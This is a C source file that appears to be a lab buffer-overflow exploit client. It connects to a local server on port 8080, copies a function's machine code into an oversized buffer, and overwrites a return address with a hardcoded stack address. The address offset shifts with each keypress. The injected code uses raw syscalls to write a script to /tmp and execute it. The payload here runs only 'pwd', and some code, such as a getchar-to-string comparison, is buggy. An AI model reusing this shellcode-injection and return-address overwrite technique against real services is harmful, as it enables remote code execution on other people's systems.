#include <arpa/inet.h> // inet_addr()
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h> // bzero()
#include <sys/socket.h>
#include <unistd.h> // read(), write(), close()
#define MAX 400
#define PORT 8080
#define SA struct sockaddr

#define __NR_write 1
#define O_CREAT 00000100
#define O_WRONLY 00000001
#define O_RDWR 00000002
#define O_TRUNC 00001000
#define __NR_open 2
#define __NR_close 3
#define __NR_execve 59

ssize_t my_write(int fd, const void *buf, size_t size);
int my_open(const char * name, int flags, mode_t mode);
int my_close(int fd);
int my_execve(const char *name, char *const argv[], char *const envp[]);


void code_2_inject(){
	const char hello[] = "#!/bin/bash\npwd\n";
    int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
    my_write(fd, hello, sizeof(hello));
    my_close(fd);
    my_execve("/tmp/maybe_a_virus",0,0);
}

ssize_t my_write(int fd, const void *buf, size_t size){
    ssize_t ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        //                 EDI      RSI       RDX
        : "0"(__NR_write), "D"(fd), "S"(buf), "d"(size)
        : "rcx", "r11", "memory"
    );
    return ret;
}


int my_open(const char * name, int flags, mode_t mode){
    int fd;
    asm volatile
    (
        "syscall"
        : "=a" (fd)
        : "0" (__NR_open), "D" (name), "S" (flags), "d" (mode)
        : "rcx", "r11", "memory"
    );
    return fd;
}

int my_close(int fd){
    int ret;
    asm volatile
    (
        "syscall"
        :"=a" (ret)
        : "0" (__NR_close), "D" (fd)
        : "rcx", "r11", "memory"
    );
    return ret;
}

int my_execve(const char *name, char *const argv[], char *const envp[]){
    int ret;
    asm volatile
    (
        "syscall"
        :"=a" (ret)
        : "0" (__NR_execve), "D" (name),"S" (argv), "d" (envp)
        : "rcx", "r11", "memory"
    );
    return ret;
}


void only_one_func (){
	const char hello[] = "#!/bin/bash\npwd\n";
    //int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
	const char file[] = "/tmp/maybe_a_virus";
	int fd;
    asm volatile
    (
        "syscall"
        : "=a" (fd)
        : "0" (__NR_open), "D" (file), "S" (O_CREAT | O_RDWR | O_TRUNC), "d" (00700)
        : "rcx", "r11", "memory"
    );
    //my_write(fd, hello, sizeof(hello));
	ssize_t ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        //                 EDI      RSI       RDX
        : "0"(__NR_write), "D"(fd), "S"(hello), "d"(sizeof(hello))
        : "rcx", "r11", "memory"
    );
    //my_close(fd);
	asm volatile
    (
        "syscall"
        :"=a" (ret)
        : "0" (__NR_close), "D" (fd)
        : "rcx", "r11", "memory"
    );
	//my_execve("/tmp/maybe_a_virus",0,0);
	asm volatile
    (
        "syscall"
        :"=a" (ret)
        : "0" (__NR_execve), "D" (file),"S" (0), "d" (0)
        : "rcx", "r11", "memory"
    );
}


void func(int sockfd)
{

	char buff[370];
	int n;
	int decalage = 0;

	for (;;) {
			// Buffer overflow
		int SERV_BUF_SIZE = 350;
		char * s = &only_one_func;
		int i = 0;
		for (;s<&func;s++,i++){
			buff[i]=*s;
			printf(" %02x",0xff& buff[i]);
			if (i%16 ==0 && i!=0){
				printf("\n%d :",i);
			}
		}
		printf("\nNombre d'octets = %d\n", i+1);
		//my_write(connfd,)
		
		int j = SERV_BUF_SIZE;
		/*
		if(i<SERV_BUF_SIZE){
			for(; s != buff ; j--,s--){
				buff[j+1] = *s; 
			}
			while(s != buff[SERV_BUF_SIZE-i]){
				*s = (char) 0x90;
			}
		}
		*/
		
		buff[SERV_BUF_SIZE + decalage +10 ] = (char) (0x40);
		buff[SERV_BUF_SIZE + decalage +11 ] = (char) 0xdc;
		buff[SERV_BUF_SIZE + decalage +12]= (char) 0xff;
		buff[SERV_BUF_SIZE + decalage +13]= (char) 0xff;
		buff[SERV_BUF_SIZE + decalage +14]= (char) 0xff;
		buff[SERV_BUF_SIZE + decalage +15]= (char) 0x7f;
		buff[SERV_BUF_SIZE + decalage +16]= (char) 0x00;
		buff[SERV_BUF_SIZE + decalage +17] = (char) 0x00;
		printf("Sending %d bytes\n",sizeof(buff));
		my_write(sockfd, buff,sizeof(buff));
		if(getchar()=="\n"){
			decalage++;
			printf("Adresse écrite à buffer+ %d\n",sizeof(buff)+decalage);
			continue;
		}
	}
}

int main()
{
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);

	// connect the client socket to server socket
	if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");

	// function for chat
	func(sockfd);

	// close the socket
	close(sockfd);
}

